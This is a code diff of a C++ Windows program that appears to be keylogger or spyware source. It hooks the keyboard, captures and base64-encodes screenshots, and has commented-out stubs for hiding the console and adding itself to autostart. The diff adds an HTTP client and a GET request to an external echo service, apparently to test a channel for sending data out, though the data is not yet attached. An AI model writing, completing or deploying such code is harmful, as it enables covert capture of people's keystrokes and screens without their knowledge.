@@ -1,12 +1,13 @@
 #include <iostream>
-#include <windows.h>
 #include "lodepng.h"
 #include "base64.h"
+#include "HTTPRequest.hpp"
+#include <windows.h>
+
 
 
 
 using namespace std;
-#include <cpr/cpr.h>
 
 HHOOK hHook = NULL;
 bool capsLock = false;
@@ -216,6 +217,33 @@ std::vector<unsigned char> getScreenshot()
     return png;
 }
 
+int sendGetRequest(string url)
+{
+    try
+    {
+        // you can pass http::InternetProtocol::V6 to Request to make an IPv6 request
+        http::Request request{url};
+        const std::vector<unsigned char> body{};
+
+        const std::vector<std::pair<std::string, std::string>> headers{
+            {"Accept", "application/json"},
+            {"User-Agent", "MyCppClient/1.0"},
+            {"X-Custom-Header", "my-value"}
+        };
+
+        // send a get request
+        const auto response = request.send("GET",body,headers);
+
+        std::cout << std::string{response.body.begin(), response.body.end()} << '\n'; // print the result
+    }
+    catch (const std::exception& e)
+    {
+        std::cerr << "Request failed, error: " << e.what() << '\n';
+    }
+    return 0;
+
+}
+
 int main()
 {
     //sets dpi process awareness to prevent the getsystemmetrics functions from returning false values
@@ -224,12 +252,8 @@ int main()
     //hideConsoleWindow();
 
     //addToAutostart();
-    cpr::Response r = cpr::Get(cpr::Url{"https://api.github.com/repos/whoshuu/cpr/contributors"},
-                               cpr::Authentication{"user", "pass", cpr::AuthMode::BASIC},
-                               cpr::Parameters{{"anon", "true"}, {"key", "value"}});
-    r.status_code;                  // 200
-    r.header["content-type"];       // application/json; charset=utf-8
-    r.text;                         // JSON text string
+
+
     //std::cout << r.text;
 
     string screenB64 = base64_encode(convertUnsignedCharVectorToString(getScreenshot()));
@@ -240,6 +264,8 @@ int main()
         std::cerr << "Keyboard hook failed!" << std::endl;
         return 1;
     }
+
+    sendGetRequest("http://echo.free.beeceptor.com");
 
     while (GetMessage(NULL, NULL, 0, 0));
     return 0;
